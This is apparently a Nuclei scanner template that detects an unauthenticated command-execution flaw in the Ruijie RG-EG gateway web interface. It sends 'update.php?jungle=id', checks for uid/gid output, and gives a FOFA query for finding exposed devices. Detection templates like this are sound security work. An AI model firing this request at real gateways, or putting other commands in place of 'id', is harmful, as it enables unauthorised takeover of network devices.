id: ruijie-rg-eg-web-mis-rce

info:
  name: 锐捷 RG-EG 易网关 远程命令执行
  author: DhiyaneshDk
  severity: critical
  description: |
    锐捷 RG-EG 易网关 WEB 管理系统前台存在命令执行，未授权攻击者可执行任意命令。
  reference:
    - https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_WEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
  classification:
    cwe-id: CWE-77
  metadata:
    verified: true
    max-request: 2
    fofa-query: body="请输入您的RG-EG易网关的用户名和密码"
  tags: ruijie,router,iot,rce,vuln
flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 200'
          - 'contains(body, "ruijie")'
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/update.php?jungle=id"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'regex("uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)", body)'
        condition: and
